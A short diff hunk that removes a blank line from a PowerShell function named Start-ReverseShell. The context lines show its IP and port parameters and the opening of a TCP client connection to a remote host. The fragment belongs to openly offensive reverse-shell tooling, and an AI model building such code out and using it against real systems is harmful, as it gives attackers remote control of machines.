@@ -6,7 +6,6 @@ Function Start-ReverseShell {
         [string]$IPAddr = "127.0.0.1" ,
         [string]$Port = "8080"
     )
-    
     try {
         # Create a TCP client and connect to the remote host
         $client = New-Object System.Net.Sockets.TCPClient($IPAddr, $Port)
